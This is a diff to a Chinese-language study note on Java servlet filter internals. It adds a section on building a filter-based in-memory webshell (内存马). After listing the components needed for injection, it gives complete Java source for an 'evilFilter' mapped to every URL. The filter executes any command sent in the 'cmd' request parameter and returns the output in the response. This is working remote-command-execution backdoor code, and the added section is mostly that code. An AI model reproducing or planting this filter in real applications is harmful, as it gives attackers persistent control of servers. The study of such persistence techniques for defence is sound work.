@@ -186,6 +186,51 @@ public void doFilter(ServletRequest request, ServletResponse response, FilterCha
 
 ![](attachments/Pasted%20image%2020230313113340.png)
 
-但是filter的使用是基于filterchan的，回到调试的调用中去看看
+但是filter的使用是基于filterchain的，回到调试的调用中去看看
 
 ![](attachments/Pasted%20image%2020230313122104.png)
+
+**思路**
+现在可以基本确定，想要编写一个Filter的内存马需要
+- 当前的servletcontext
+- filterconfigs
+- 要注入的恶意filter对象
+- filterdef
+
+## 内存马编写
+
+### 恶意Filter
+```java
+package org.example.demo.filter;  
+  
+import javax.servlet.*;  
+import javax.servlet.annotation.*;  
+import java.io.IOException;  
+  
+@WebFilter(filterName = "evilFilter", urlPatterns = "/*")  
+public class evilFilter implements Filter {  
+    public void init(FilterConfig config) throws ServletException {  
+    }  
+  
+    public void destroy() {  
+    }  
+  
+  
+    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {  
+        if(request.getParameter("cmd")!=null) {  
+            java.io.InputStream in  = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();  
+            int a = -1;  
+            byte[] b = new byte[2048];  
+            response.getWriter().println("<pre>");  
+            while ((a = in.read(b))!=-1) {  
+                response.getWriter().println(new String(b));  
+            }  
+            response.getWriter().println("</pre>");  
+        }  
+        chain.doFilter(request, response);  
+    }  
+}
+```
+
+![](attachments/Pasted%20image%2020230313145258.png)
+
